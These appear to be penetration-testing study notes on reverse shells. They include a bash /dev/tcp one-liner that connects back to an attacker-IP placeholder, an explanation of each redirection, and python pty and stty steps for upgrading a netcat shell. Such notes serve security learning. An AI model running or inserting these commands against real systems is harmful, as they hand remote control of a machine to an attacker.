### General Notes

Used to get remote code execution (RCE).

> Can be found online: [Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).

---
### Finding the Right Reverse shell

Using the cheat sheet above, it has different techniques. Check first for the presence of that programming language or tool on the system before running these commands to make sure they can work.

> For example, to run the `python` one-liner, first make sure we can execute python on the target machine. Might work for `python` and not `python3`, so try all cases.

---
### Reverse Shells on Linux Machines

An attacker will usually have a [[netcat]] listener open on a chosen [[Port]] that the reverse shell will connect to. Some examples of one liners for Linux:
- Using `bash`
- Using `socat`
- Using `python`

The Bash `/dev/tcp` reverse shell:
```bash
bash -i >& /dev/tcp/<attacker-ip>/<attacker-port> 0>&1
```
- `bash -i` launches an interactive shell.
- `/dev/tcp/IP/port` bash interprets this path and opens a TCP socket to that `IP:port`.
- `>&` redirects both *stdout* and *stderr* into that socket, so command output travels to the attacker.
- `0>&1` redirects *stdin* `fd 0` to the same place as *stdout* `fd 1`, so the attacker’s keystrokes become the shell’s input.

----

### Upgrade a Reverse Shell

Sometimes, we get a shell where the `TAB`, arrow keys, and shortcuts don't work. To upgrade our shell to make it more usable, we can do the following:

1. After connection using `netcat`, run this code in the `netcat` session.
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

2. Background the `netcat` session by typing `CTRL+Z`.
3. Connect back the `netcat` session by running:
```bash
stty raw -echo; fg
```

Now, we have an improved shell.

---
